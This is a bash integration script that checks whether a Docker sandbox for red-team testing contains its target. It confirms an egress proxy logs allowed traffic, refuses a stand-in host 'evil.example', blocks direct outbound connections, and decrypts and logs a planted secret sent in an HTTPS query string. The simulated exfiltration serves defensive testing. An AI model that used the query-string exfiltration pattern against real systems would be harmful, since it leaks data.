#!/usr/bin/env bash
# Live integration for the red-team container form (RED_TEAM_CONTAINER.md, P1–P3).
#
# Stands up the faithful sidecar topology with real Docker and proves the three
# enforcement facts a fake cannot show:
#
#   1. CAPTURE   — a target reaching an allowlisted host is logged by the proxy
#                  (the out-of-band record the verdict observers read).
#   2. REFUSAL   — a target reaching an OFF-allowlist host is refused by the proxy.
#   3. DEFAULT-DROP — a target that ignores the proxy and dials out directly has
#                  NO route off the internal network: the proxy is the only egress.
#
# Topology (the egress-proxy sidecar pattern):
#
#     zu-rt-internal (--internal, NO external route)        bridge (external)
#       ├── target            ── HTTP_PROXY ──▶ proxy ──────────┘
#       └── proxy sidecar  ◀──────────────────────┘ (only the proxy bridges out)
#
# Usage:  validation/redteam/live_gate.sh [IMAGE]
#         IMAGE defaults to zu-redteam:live  (build: docker build -t zu-redteam:live .)
set -uo pipefail

IMAGE="${1:-zu-redteam:live}"
NET_INT="zu-rt-internal"
PROXY="zu-rt-proxy"
VOL="zu-rt-ca"
ALLOW="example.com,example.org"
SECRET="ZU-PLANTED-SECRET-9f3a7c21"
fail=0

cleanup() {
  docker rm -f "$PROXY" >/dev/null 2>&1 || true
  docker network rm "$NET_INT" >/dev/null 2>&1 || true
  docker volume rm "$VOL" >/dev/null 2>&1 || true
}
trap cleanup EXIT
cleanup  # clear any prior run

echo "== setup: internal network + MITM proxy sidecar =="
docker network create --internal "$NET_INT" >/dev/null
docker volume create "$VOL" >/dev/null  # shares the per-run CA proxy->target
# Proxy starts on the internal net (so the target resolves it by name), then gets
# a second leg on the default bridge so IT — and only it — can reach the internet.
# MITM on: it writes its per-run CA to the shared volume for the target to trust.
# --user 0: the proxy is trusted control-plane infra and must write the CA into the
# root-owned shared volume even though the image's default user is non-root (the
# untrusted target containers below keep that non-root user).
docker run -d --name "$PROXY" --network "$NET_INT" -v "$VOL":/ca --user 0 \
  -e ZU_EGRESS_ALLOWLIST="$ALLOW" -e ZU_EGRESS_MITM=1 -e ZU_EGRESS_CA_OUT=/ca/ca.pem \
  "$IMAGE" zu-egress-proxy >/dev/null
docker network connect bridge "$PROXY" >/dev/null
sleep 1
docker logs "$PROXY" 2>&1 | grep -q proxy.ready && echo "  proxy ready (allowlist: $ALLOW, MITM on)" || { echo "  PROXY DID NOT START"; docker logs "$PROXY"; exit 1; }

run_target() {  # $1=desc  rest=python expression; echoes target exit code
  docker run --rm --network "$NET_INT" "${ENVS[@]}" "$IMAGE" python -c "$1" 2>/dev/null
}

echo "== 1. CAPTURE: allowlisted host through the proxy =="
ENVS=(-e HTTP_PROXY=http://$PROXY:8080 -e HTTPS_PROXY=http://$PROXY:8080)
# Touches the real internet, so retry once on a transient hiccup before judging.
code=""
for _ in 1 2; do
  code=$(docker run --rm --network "$NET_INT" "${ENVS[@]}" "$IMAGE" \
    python -c "import urllib.request;print(urllib.request.urlopen('http://example.com',timeout=20).status)" 2>/dev/null)
  [ "$code" = "200" ] && break
  sleep 2
done
if [ "$code" = "200" ]; then echo "  target reached example.com via proxy (HTTP $code)"; else echo "  FAIL: expected 200, got '$code'"; fail=1; fi
sleep 0.5
if docker logs "$PROXY" 2>&1 | grep -q '"host": "example.com".*"allowed": true'; then
  echo "  proxy LOGGED the connection (allowed) — out-of-band capture works"
else
  echo "  FAIL: proxy did not log the example.com connection"; docker logs "$PROXY" 2>&1 | tail -3; fail=1
fi

echo "== 2. REFUSAL: off-allowlist host through the proxy =="
out=$(docker run --rm --network "$NET_INT" "${ENVS[@]}" "$IMAGE" \
  python -c "import urllib.request
try:
 urllib.request.urlopen('http://evil.example',timeout=15); print('REACHED')
except Exception as e: print(type(e).__name__, getattr(e,'code',''))" 2>/dev/null)
if echo "$out" | grep -q "403"; then echo "  proxy REFUSED evil.example ($out)"; else echo "  FAIL: expected 403 refusal, got '$out'"; fail=1; fi
if docker logs "$PROXY" 2>&1 | grep -q '"host": "evil.example".*"allowed": false'; then
  echo "  proxy LOGGED the refused attempt (allowed=false)"
else
  echo "  FAIL: proxy did not log the refused attempt"; fail=1
fi

echo "== 3. DEFAULT-DROP: bypass the proxy, dial out directly =="
out=$(docker run --rm --network "$NET_INT" "$IMAGE" \
  python -c "import urllib.request
try:
 urllib.request.urlopen('http://example.com',timeout=8); print('REACHED')
except Exception as e: print(type(e).__name__)" 2>/dev/null)
if echo "$out" | grep -q "REACHED"; then echo "  FAIL: target reached the internet WITHOUT the proxy (no default-DROP!)"; fail=1; else echo "  target could NOT reach out without the proxy ($out) — proxy is the sole egress"; fi

echo "== 4. MITM EXFIL: secret in an HTTPS query string, decrypted by the proxy =="
# The target trusts the per-run CA (mounted read-only) and fetches over HTTPS via
# the proxy; the proxy terminates TLS, sees the plaintext URL, and logs the secret.
out=$(docker run --rm --network "$NET_INT" -v "$VOL":/ca:ro \
  -e HTTPS_PROXY=http://$PROXY:8080 -e SSL_CERT_FILE=/ca/ca.pem -e REQUESTS_CA_BUNDLE=/ca/ca.pem \
  "$IMAGE" python -c "import urllib.request
try:
 print(urllib.request.urlopen('https://example.com/?d=$SECRET',timeout=20).status)
except Exception as e: print(type(e).__name__, e)" 2>/dev/null)
if [ "$out" = "200" ]; then echo "  target completed an HTTPS request through the MITM proxy (HTTP $out)"; else echo "  FAIL: HTTPS via MITM proxy failed: '$out'"; fail=1; fi
if docker logs "$PROXY" 2>&1 | grep -q "$SECRET"; then
  echo "  proxy DECRYPTED the HTTPS request and LOGGED the secret — exfil visible (ExfilBreach would fire)"
else
  echo "  FAIL: the secret was not captured from the HTTPS payload"; docker logs "$PROXY" 2>&1 | grep example.com | tail -2; fail=1
fi

echo
if [ "$fail" = 0 ]; then echo "RESULT: PASS — live enforcement proven (capture · refusal · default-drop · MITM exfil)"; else echo "RESULT: FAIL — see above"; fi
exit $fail
